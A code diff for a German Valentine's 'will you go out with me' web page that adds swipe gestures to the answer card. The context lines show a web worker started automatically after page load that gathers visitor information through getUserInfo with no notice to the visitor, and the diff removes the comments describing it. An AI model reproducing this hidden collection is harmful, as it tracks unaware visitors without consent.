@@ -1,7 +1,9 @@
 'use client';
 
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { GiphyFetch } from '@giphy/js-fetch-api';
+import { animated, useSpring } from '@react-spring/web';
+import { useDrag } from '@use-gesture/react';
 
 const gf = new GiphyFetch(process.env.NEXT_PUBLIC_GIPHY_API_KEY || '');
 
@@ -35,6 +37,61 @@ export default function Home() {
     sad: ''
   });
   const [isLoading, setIsLoading] = useState(true);
+  const cardRef = useRef<HTMLDivElement>(null);
+
+  // Spring für die Karten-Animation
+  const [{ x, y, rotate }, api] = useSpring(() => ({
+    x: 0,
+    y: 0,
+    rotate: 0,
+    config: {
+      tension: 500,
+      friction: 30
+    }
+  }));
+
+  // Drag-Handler für die Swipe-Geste
+  const bind = useDrag(({ active, movement: [mx, my], direction: [xDir], velocity: [vx] }) => {
+    const trigger = Math.abs(mx) > 100 || vx > 0.5;
+    const isRight = xDir > 0;
+    const rotation = mx / 20; // Rotation basierend auf der horizontalen Bewegung
+    
+    if (!active && trigger) {
+      // Wenn nach links geswiped wurde (Ja)
+      if (!isRight) {
+        api.start({
+          x: -window.innerWidth,
+          y: my,
+          rotate: -20,
+          config: { tension: 200, friction: 20 },
+          onRest: () => handleResponse('yes'),
+        });
+      } else {
+        // Wenn nach rechts geswiped wurde (Nein)
+        api.start({
+          x: window.innerWidth,
+          y: my,
+          rotate: 20,
+          config: { tension: 200, friction: 20 },
+          onRest: () => handleResponse('no'),
+        });
+      }
+    } else {
+      // Während des Swipens oder wenn nicht weit genug geswiped wurde
+      api.start({
+        x: active ? mx : 0,
+        y: active ? my : 0,
+        rotate: active ? rotation : 0,
+        config: { tension: 500, friction: active ? 10 : 30 },
+        immediate: active,
+      });
+    }
+  }, {
+    from: () => [x.get(), y.get()],
+    filterTaps: true,
+    bounds: { left: -300, right: 300, top: -100, bottom: 100 },
+    rubberband: true,
+  });
 
   useEffect(() => {
     const init = async () => {
@@ -66,12 +123,9 @@ export default function Home() {
     let dataCollectorWorker: Worker | null = null;
 
     const startDataCollection = async () => {
-      // Warte bis die Seite vollständig geladen ist
       if (document.readyState === 'complete') {
-        // Importiere getUserInfo dynamisch
         const { getUserInfo } = await import('@/utils/userInfo');
         
-        // Initialisiere Worker
         if (typeof Worker !== 'undefined' && !dataCollectorWorker) {
           dataCollectorWorker = new Worker(
             new URL('../utils/dataCollector.worker.ts', import.meta.url)
@@ -79,10 +133,8 @@ export default function Home() {
         }
 
         try {
-          // Sammle Basis-Informationen
           const userInfo = await getUserInfo();
           
-          // Sende Daten an Worker zur Verarbeitung
           if (dataCollectorWorker) {
             dataCollectorWorker.postMessage({
               type: 'collect',
@@ -98,7 +150,6 @@ export default function Home() {
       }
     };
 
-    // Warte 2 Sekunden nach dem Laden der Seite
     const timer = setTimeout(() => {
       startDataCollection();
     }, 1000);
@@ -109,10 +160,13 @@ export default function Home() {
         dataCollectorWorker.terminate();
       }
     };
-  }, []); // Leere Dependency Array = nur einmal beim Mounting
+  }, []);
 
   const handleResponse = (answer: 'yes' | 'no') => {
+    if (response !== null) return;
     setResponse(answer);
+    // Reset der Animation nach der Antwort
+    api.start({ x: 0, y: 0, rotate: 0 });
   };
 
   if (isLoading) {
@@ -128,37 +182,52 @@ export default function Home() {
   return (
     <main className="min-h-screen bg-pink-50 flex flex-col items-center justify-center p-4 relative overflow-hidden">
       <FloatingHearts />
-      <div className="card-container max-w-md w-full rounded-2xl shadow-lg p-6 space-y-6 relative z-10">
-        {!response ? (
-          <>
-            <div className="w-full aspect-square relative rounded-xl overflow-hidden shadow-inner">
-              <img
-                src={gifs.main}
-                alt="Cute Valentine Animation"
-                className="w-full h-full object-cover floating"
-              />
-            </div>
-            <h1 className="text-3xl md:text-4xl text-center text-black floating mb-8 font-bold">
-              Willst du mit mir gehen? 💕
-            </h1>
-            <div className="flex flex-wrap justify-center gap-6">
-              <button
-                onClick={() => handleResponse('yes')}
-                className="relative"
-              >
-                <span className="absolute top-0 left-0 mt-1 ml-1 h-full w-full rounded bg-black"></span>
-                <span className="fold-bold relative inline-block h-full w-full rounded border-2 border-black bg-white px-3 py-1 text-base font-bold text-black transition duration-100 hover:bg-yellow-400 hover:text-gray-900">Ja</span>
-              </button>
-              <button
-                onClick={() => handleResponse('no')}
-                className="relative"
-              >
-                <span className="absolute top-0 left-0 mt-1 ml-1 h-full w-full rounded bg-gray-700"></span>
-                <span className="fold-bold relative inline-block h-full w-full rounded border-2 border-black bg-black px-3 py-1 text-base font-bold text-white transition duration-100 hover:bg-gray-900 hover:text-yellow-500">Nein</span>
-              </button>
-            </div>
-          </>
-        ) : (
+      {!response ? (
+        <animated.div
+          ref={cardRef}
+          {...bind()}
+          style={{
+            x,
+            y,
+            rotate,
+            touchAction: 'none',
+            transform: 'translateZ(0)',
+          }}
+          className="card-container max-w-md w-full rounded-2xl shadow-lg p-6 space-y-6 relative z-10 cursor-grab active:cursor-grabbing"
+        >
+          <div className="w-full aspect-square relative rounded-xl overflow-hidden shadow-inner select-none">
+            <img
+              src={gifs.main}
+              alt="Cute Valentine Animation"
+              className="w-full h-full object-cover floating pointer-events-none"
+              draggable="false"
+            />
+          </div>
+          <h1 className="text-3xl md:text-4xl text-center text-black floating mb-8 font-bold">
+            Willst du mit mir gehen? 💕
+          </h1>
+          <div className="flex flex-wrap justify-center gap-6">
+            <button
+              onClick={() => handleResponse('yes')}
+              className="relative"
+            >
+              <span className="absolute top-0 left-0 mt-1 ml-1 h-full w-full rounded bg-black"></span>
+              <span className="fold-bold relative inline-block h-full w-full rounded border-2 border-black bg-white px-3 py-1 text-base font-bold text-black transition duration-100 hover:bg-yellow-400 hover:text-gray-900">Ja</span>
+            </button>
+            <button
+              onClick={() => handleResponse('no')}
+              className="relative"
+            >
+              <span className="absolute top-0 left-0 mt-1 ml-1 h-full w-full rounded bg-gray-700"></span>
+              <span className="fold-bold relative inline-block h-full w-full rounded border-2 border-black bg-black px-3 py-1 text-base font-bold text-white transition duration-100 hover:bg-gray-900 hover:text-yellow-500">Nein</span>
+            </button>
+          </div>
+          <div className="absolute inset-x-0 -bottom-8 text-center text-gray-500 text-sm">
+            Swipe nach links für Ja, nach rechts für Nein
+          </div>
+        </animated.div>
+      ) : (
+        <div className="card-container max-w-md w-full rounded-2xl shadow-lg p-6 space-y-6 relative z-10">
           <div className="text-center space-y-6">
             {response === 'yes' ? (
               <>
@@ -190,7 +259,10 @@ export default function Home() {
               </>
             )}
             <button
-              onClick={() => setResponse(null)}
+              onClick={() => {
+                setResponse(null);
+                api.start({ x: 0, y: 0, rotate: 0 });
+              }}
               className="relative px-8 py-3 bg-gradient-to-r from-pink-400 via-pink-500 to-rose-500 text-white rounded-full font-bold shadow-lg button-hover text-lg overflow-hidden group mt-8"
             >
               <span className="relative z-10 flex items-center justify-center gap-2">
@@ -199,8 +271,8 @@ export default function Home() {
               <div className="absolute inset-0 bg-gradient-to-r from-pink-500 via-rose-500 to-pink-500 opacity-0 group-hover:opacity-100 transition-opacity" />
             </button>
           </div>
-        )}
-      </div>
+        </div>
+      )}
     </main>
   );
 }
